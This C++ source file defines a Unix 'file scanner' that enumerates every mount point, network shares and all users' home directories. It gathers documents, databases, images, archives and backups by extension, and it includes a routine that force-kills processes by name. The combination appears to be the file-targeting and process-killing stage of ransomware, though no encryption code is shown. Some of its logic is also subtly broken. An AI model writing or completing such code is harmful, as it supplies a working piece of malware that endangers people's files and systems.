#include "core/file_scanner.h"
#include <filesystem>
#include <vector>
#include <string>
#include <algorithm>
#include <fstream>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <mntent.h>
#include <pwd.h>

namespace fs = std::filesystem;

class UnixFileScanner : public FileScanner {
private:
    std::vector<std::string> targetExtensions;
    bool scanHiddenFiles = false;
    bool scanSystemFiles = false;
    static const int MAX_SCAN_DEPTH = 10;
    
public:
    UnixFileScanner() {
        // Initialize target extensions
        targetExtensions = {
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".pdf", ".txt", ".rtf", ".csv", ".jpg", ".jpeg",
            ".png", ".gif", ".bmp", ".mp4", ".avi", ".mov",
            ".zip", ".rar", ".7z", ".tar", ".sql", ".mdb",
            ".db", ".dbf", ".sqlite", ".psd", ".ai", ".svg",
            ".cpp", ".c", ".h", ".hpp", ".py", ".js", ".html",
            ".css", ".xml", ".json", ".yaml", ".yml", ".conf",
            ".cfg", ".ini", ".log", ".bak", ".backup", ".old"
        };
    }
    
    void ScanAllDrives(std::vector<std::string>& results) override {
        // Scan mount points instead of drives
        std::vector<std::string> mountPoints = GetMountPoints();
        
        for (const auto& mountPoint : mountPoints) {
            if (ShouldScanDirectory(mountPoint)) {
                ScanDirectory(mountPoint, results);
            }
        }
        
        // Also scan user directories
        ScanUserDirectories(results);
    }
    
    void ScanNetworkShares(std::vector<std::string>& results) override {
        // Scan network mounts (NFS, Samba, etc.)
        std::vector<std::string> mountPoints = GetMountPoints();
        
        for (const auto& mountPoint : mountPoints) {
            if (IsNetworkMount(mountPoint)) {
                ScanDirectory(mountPoint, results);
            }
        }
    }
    
private:
    void ScanUserDirectories(std::vector<std::string>& results) {
        // Get all user directories
        std::vector<std::string> userDirs = GetUserDirectories();
        
        for (const auto& userDir : userDirs) {
            if (fs::exists(userDir) && ShouldScanDirectory(userDir)) {
                ScanDirectory(userDir, results);
            }
        }
    }
    
    std::vector<std::string> GetMountPoints() {
        std::vector<std::string> mountPoints;
        
        FILE* mounts = setmntent("/proc/mounts", "r");
        if (!mounts) return mountPoints;
        
        struct mntent* entry;
        while ((entry = getmntent(mounts)) != nullptr) {
            std::string mountPoint(entry->mnt_dir);
            
            // Skip system mounts
            if (mountPoint.find("/proc") == 0 ||
                mountPoint.find("/sys") == 0 ||
                mountPoint.find("/dev") == 0 ||
                mountPoint.find("/run") == 0) {
                continue;
            }
            
            mountPoints.push_back(mountPoint);
        }
        
        endmntent(mounts);
        return mountPoints;
    }
    
    bool IsNetworkMount(const std::string& mountPoint) {
        FILE* mounts = setmntent("/proc/mounts", "r");
        if (!mounts) return false;
        
        struct mntent* entry;
        bool isNetwork = false;
        
        while ((entry = getmntent(mounts)) != nullptr) {
            if (std::string(entry->mnt_dir) == mountPoint) {
                std::string fsType(entry->mnt_fsname);
                
                // Check for network filesystem types
                if (fsType.find("nfs") != std::string::npos ||
                    fsType.find("cifs") != std::string::npos ||
                    fsType.find("smb") != std::string::npos ||
                    fsType.find("nfs4") != std::string::npos) {
                    isNetwork = true;
                }
                break;
            }
        }
        
        endmntent(mounts);
        return isNetwork;
    }
    
    std::vector<std::string> GetUserDirectories() {
        std::vector<std::string> userDirs;
        
        // Current user directories
        const char* home = getenv("HOME");
        if (home) {
            userDirs.push_back(std::string(home) + "/Documents");
            userDirs.push_back(std::string(home) + "/Desktop");
            userDirs.push_back(std::string(home) + "/Downloads");
            userDirs.push_back(std::string(home) + "/Pictures");
            userDirs.push_back(std::string(home) + "/Videos");
            userDirs.push_back(std::string(home) + "/Music");
            userDirs.push_back(std::string(home) + "/Projects");
            userDirs.push_back(std::string(home) + "/Work");
        }
        
        // Scan all user home directories
        struct passwd* pw;
        setpwent();
        
        while ((pw = getpwent()) != nullptr) {
            std::string userHome(pw->pw_dir);
            
            // Skip system users
            if (userHome.find("/home/") == std::string::npos) continue;
            
            userDirs.push_back(userHome + "/Documents");
            userDirs.push_back(userHome + "/Desktop");
            userDirs.push_back(userHome + "/Downloads");
        }
        
        endpwent();
        
        // Common shared directories
        userDirs.push_back("/home/shared");
        userDirs.push_back("/usr/share");
        userDirs.push_back("/opt");
        userDirs.push_back("/tmp");
        userDirs.push_back("/var/tmp");
        
        return userDirs;
    }
    
    void ScanDirectory(const std::string& path, std::vector<std::string>& results) {
        if (!ShouldScanDirectory(path)) return;
        
        try {
            int currentDepth = 0;
            for (const auto& entry : fs::recursive_directory_iterator(path, fs::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file()) {
                    std::string filePath = entry.path().string();
                    
                    if (ShouldScanFile(filePath)) {
                        results.push_back(filePath);
                    }
                }
                
                // Simple depth tracking based on path depth
                std::string pathStr = entry.path().string();
                currentDepth = std::count(pathStr.begin(), pathStr.end(), '/') + 
                              std::count(pathStr.begin(), pathStr.end(), '\\') - 1;
                
                if (currentDepth >= MAX_SCAN_DEPTH) {
                    break;
                }
            }
        }
        catch (const fs::filesystem_error& e) {
            // Ignore permission errors and continue
        }
        catch (...) {
            // Ignore other errors and continue
        }
    }
    
    bool ShouldScanDirectory(const std::string& path) {
        // Skip system directories
        if (path.find("/proc") == 0 ||
            path.find("/sys") == 0 ||
            path.find("/dev") == 0 ||
            path.find("/run") == 0 ||
            path.find("/boot") == 0) {
            return false;
        }
        
        // Skip hidden directories unless enabled
        if (!scanHiddenFiles && !path.empty() && path[0] == '.') {
            return false;
        }
        
        // Check if directory is accessible
        struct stat st;
        if (stat(path.c_str(), &st) != 0) {
            return false;
        }
        
        return S_ISDIR(st.st_mode) && (st.st_mode & S_IRUSR);
    }
    
    bool ShouldScanFile(const std::string& filePath) {
        // Check file extension
        std::string extension = fs::path(filePath).extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
        
        bool hasTargetExtension = std::find(targetExtensions.begin(), targetExtensions.end(), extension) != targetExtensions.end();
        
        if (!hasTargetExtension) return false;
        
        // Skip hidden files unless enabled
        std::string filename = fs::path(filePath).filename().string();
        if (!scanHiddenFiles && !filename.empty() && filename[0] == '.') {
            return false;
        }
        
        // Skip system files unless enabled
        if (!scanSystemFiles && (filename.find("system") != std::string::npos ||
                                 filename.find("config") != std::string::npos ||
                                 filename.find("cache") != std::string::npos)) {
            return false;
        }
        
        // Check if file is readable
        struct stat st;
        if (stat(filePath.c_str(), &st) != 0) {
            return false;
        }
        
        return S_ISREG(st.st_mode) && (st.st_mode & S_IRUSR);
    }
    
    bool TerminateProcess(const std::string& processName) override {
        // Unix process termination
        DIR* dir = opendir("/proc");
        if (!dir) return false;
        
        bool terminated = false;
        struct dirent* entry;
        
        while ((entry = readdir(dir)) != nullptr) {
            if (!isdigit(entry->d_name[0])) continue;
            
            pid_t pid = atoi(entry->d_name);
            
            // Get process name
            std::string commPath = std::string("/proc/") + std::to_string(pid) + "/comm";
            std::ifstream commFile(commPath);
            std::string comm;
            
            if (commFile >> comm) {
                if (comm.find(processName) != std::string::npos) {
                    kill(pid, SIGTERM);
                    usleep(1000000); // Wait 1 second
                    kill(pid, SIGKILL); // Force kill if still running
                    terminated = true;
                }
            }
        }
        
        closedir(dir);
        return terminated;
    }
};
